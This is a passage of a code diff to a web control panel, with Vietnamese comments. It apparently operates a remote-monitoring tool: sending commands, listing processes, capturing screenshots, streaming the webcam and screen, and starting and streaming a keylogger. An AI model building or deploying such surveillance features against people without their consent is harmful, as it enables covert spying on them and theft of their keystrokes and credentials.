             body: JSON.stringify({cmd: cmd, arg: arg})
         });
-        alert('Command sent: ' + cmd);
+        alert('Command sent: ' + cmd + (arg ? ' ' + arg : ''));
     }
 
     async function loadList(type) {
         const tbody = document.getElementById(type == 'processes' ? 'proc-list' : 'app-list');
-        tbody.innerHTML = '<tr><td colspan="3">Loading data...</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="3" class="text-center">Loading data...</td></tr>';
         const res = await fetch('/api/' + type);
         const data = await res.json();
         tbody.innerHTML = '';
         data.forEach(d => {
-            let row = type == 'processes' 
-                ? `<td>${d.name}</td><td class="text-info">${d.pid}</td><td>${d.mem}</td>`
-                : `<td>${d.name}</td><td>${d.ver}</td><td class="text-muted">${d.loc}</td>`;
+            const row = (type == 'processes') 
+                ? `<td>${d.name}</td><td>${d.pid}</td><td>${d.mem}</td>`
+                : `<td>${d.name}</td><td>${d.version}</td><td>${d.publisher}</td>`;
             tbody.innerHTML += `<tr>${row}</tr>`;
         });
     }
 
-    function captureScreen() {
+        function captureScreen() {
         const img = document.getElementById('screen-img');
-        document.getElementById('screen-msg').innerText = "Capturing...";
+        const msg = document.getElementById('screen-msg');
+        
+        // Reset trạng thái
+        msg.style.display = 'block';
+        msg.innerText = "Capturing...";
         img.style.display = 'none';
-        img.src = '/api/screenshot?t=' + Date.now();
-        img.onload = () => { img.style.display = 'block'; document.getElementById('screen-msg').style.display='none'; }
+        img.src = ''; // Clear old image
+        img.dataset.cachedSrc = ''; // Clear cache marker
+        
+        const timestamp = Date.now();
+        // FIX: Thêm save=true để chỉ lưu khi user click CAPTURE
+        const screenshotUrl = '/api/screenshot?save=true&t=' + timestamp;
+        
+        // Setup handlers TRƯỚC KHI set src
+        img.onload = () => { 
+            console.log('✅ Screenshot loaded successfully');
+            img.style.display = 'block'; 
+            msg.style.display = 'none';
+            
+            // Save to localStorage AND mark as cached
+            lastScreenshotTime = timestamp;
+            localStorage.setItem('lastScreenshotTime', timestamp.toString());
+            localStorage.setItem('lastScreenshotUrl', screenshotUrl);
+            img.dataset.cachedSrc = screenshotUrl; // Mark this image as cached
+        };
+        
+        img.onerror = (e) => {
+            console.error('❌ Screenshot load error:', e);
+            msg.innerText = "Error loading screenshot";
+            msg.style.display = 'block';
+            img.style.display = 'none';
+        };
+        
+        // Set src SAU KHI setup handlers
+        img.src = screenshotUrl;
+        console.log('📸 Requesting screenshot:', screenshotUrl);
     }
 
     function toggleCam(state) {
         const img = document.getElementById('cam-img');
+        const placeholder = document.getElementById('cam-placeholder');
+        
         if(state) {
-            img.src = '/video_feed?t=' + Date.now();
+            const streamUrl = '/video_feed?t=' + Date.now();
+            img.src = streamUrl;
+            img.style.display = 'block';
+            placeholder.style.display = 'none';
+            
+            webcamActive = true;
+            localStorage.setItem('webcamActive', 'true');
+            img.dataset.streaming = 'true';
             alert("📹 Webcam stream started");
         } else { 
-            img.src = ''; 
+            img.src = '';
+            img.style.display = 'none';
+            placeholder.style.display = 'flex';
+            
+            webcamActive = false;
+            localStorage.setItem('webcamActive', 'false');
+            img.dataset.streaming = 'false';
             fetch('/api/webcam/off', {method:'POST'})
                 .then(r => r.json())
                 .then(d => alert(d.status));
@@ -236,71 +718,57 @@
         const term = document.getElementById('key-term');
         
         if (state) {
-            if (isKeyloggerActive) return;
-            
-            isKeyloggerActive = true;
-            term.textContent = "[SYSTEM] Starting keylogger...\n";
-            
-            // Đóng stream cũ
-            if (eventSource) {
-                eventSource.close();
-                eventSource = null;
-            }
-            
-            // Gửi lệnh START
             fetch('/api/keylog/toggle', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ state: true })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({state: true})
             })
+            .then(r => r.json())
             .then(() => {
-                // Đợi 2 giây để C++ server ready
+                term.textContent = 'Initializing keylogger...\n';
+                
                 setTimeout(() => {
+                    if (eventSource) eventSource.close();
+                    
                     eventSource = new EventSource('/api/keylog/stream');
+                    isKeyloggerActive = true;
                     
                     eventSource.onmessage = function(e) {
-                        if (e.data.includes('[ERROR]') || e.data.includes('[DISCONNECTED]')) {
-                            term.textContent += e.data + '\n';
-                            if (eventSource) {
-                                eventSource.close();
-                                eventSource = null;
-                            }
-                            isKeyloggerActive = false;
-                            return;
-                        }
-                        
-                        term.textContent += e.data;
+                        term.textContent += e.data + '\n';
                         term.scrollTop = term.scrollHeight;
                     };
                     
-                    eventSource.onerror = function(e) {
-                        console.error('[ERROR] EventSource error');
-                        term.textContent += '\n[ERROR] Connection lost\n';
-                        if (eventSource) {
+                    eventSource.onerror = function(err) {
+                        console.error('EventSource error:', err);
+                        term.textContent += '\n[ERROR] Keylogger stream disconnected. Click STOP and try again.\n';
+                        if (eventSource.readyState === EventSource.CLOSED) {
                             eventSource.close();
-                            eventSource = null;
+                            isKeyloggerActive = false;
                         }
-                        isKeyloggerActive = false;
                     };
+                    
+                    term.textContent += '[INFO] Keylogger started. Listening for keystrokes...\n';
                 }, 2000);
+            })
+            .catch(err => {
+                term.textContent += `\n[ERROR] Failed to start keylogger: ${err}\n`;
             });
             
         } else {
-            // STOP
-            isKeyloggerActive = false;
-            
             if (eventSource) {
                 eventSource.close();
                 eventSource = null;
             }
+            isKeyloggerActive = false;
             
             fetch('/api/keylog/toggle', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ state: false })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({state: false})
             })
+            .then(r => r.json())
             .then(() => {
-                term.textContent += '\n[SYSTEM] Keylogger stopped\n';
+                term.textContent += '\n[INFO] Keylogger stopped.\n';
             });
         }
     }
@@ -308,6 +776,98 @@
     function clearKeylog() {
         document.getElementById('key-term').textContent = '';
     }
+
+    // Webcam restore helper
+    function tryRestoreWebcam(attempt = 1) {
+        const img = document.getElementById('cam-img');
+        if (!img || attempt > 6) return;
+
+        const streamUrl = '/video_feed?t=' + Date.now();
+        img.onload = null;
+        img.onerror = null;
+
+        img.onload = () => {
+            webcamActive = true;
+            localStorage.setItem('webcamActive', 'true');
+            img.dataset.streaming = 'true';
+            img.style.display = 'block';
+            console.log('✅ Webcam restored on attempt ' + attempt);
+        };
+
+        img.onerror = () => {
+            if (attempt < 6) {
+                console.log(`⚠️ Webcam restore attempt ${attempt} failed, retrying...`);
+                setTimeout(() => tryRestoreWebcam(attempt + 1), 800 * attempt);
+            } else {
+                console.error('❌ Webcam restore failed after 6 attempts');
+                webcamActive = false;
+                localStorage.setItem('webcamActive', 'false');
+            }
+        };
+
+        img.src = streamUrl;
+    }
+    
+    // Live Screen Monitoring State
+    let screenStreamActive = false;
+
+    function toggleScreenStream() {
+        const btn = document.getElementById('screen-stream-btn');
+        const thumb = document.getElementById('screen-live-thumb');
+        const placeholder = document.getElementById('screen-live-placeholder');
+        const fpsIndicator = document.getElementById('screen-fps');
+        const statusEl = document.getElementById('screen-stream-status');
+        
+        if (screenStreamActive) {
+            // STOP
+            thumb.src = '';
+            thumb.style.display = 'none';
+            placeholder.style.display = 'flex';
+            fpsIndicator.style.display = 'none';
+            
+            screenStreamActive = false;
+            
+            btn.innerHTML = '<i class="fa-solid fa-play mr-1"></i> START MONITORING';
+            btn.className = 'w-full px-3 py-2 rounded text-sm font-bold bg-green-600 hover:bg-green-700 text-white';
+            
+            if (statusEl) {
+                statusEl.innerText = 'Offline';
+                statusEl.className = 'font-mono text-red-400';
+            }
+            
+            console.log('🛑 Screen monitoring stopped');
+        } else {
+            // START
+            const streamUrl = '/screen_feed?t=' + Date.now();
+            thumb.src = streamUrl;
+            thumb.style.display = 'block';
+            placeholder.style.display = 'none';
+            fpsIndicator.style.display = 'block';
+            
+            screenStreamActive = true;
+            
+            btn.innerHTML = '<i class="fa-solid fa-stop mr-1"></i> STOP MONITORING';
+            btn.className = 'w-full px-3 py-2 rounded text-sm font-bold bg-red-600 hover:bg-red-700 text-white';
+            
+            if (statusEl) {
+                statusEl.innerText = 'Live';
+                statusEl.className = 'font-mono text-green-400';
+            }
+            
+            console.log('✅ Screen monitoring started');
+        }
+    }
+
+    // Initialize on page load
+    window.addEventListener('DOMContentLoaded', () => {
+        // Start auto-update immediately
+        updateDashboardStats();
+        dashboardInterval = setInterval(updateDashboardStats, 3000);
+        console.log('✅ Dashboard auto-update started (every 3s)');
+        
+        // Restore webcam if was active
+        if (webcamActive) tryRestoreWebcam(1);
+    });
 </script>
 </body>
 </html>
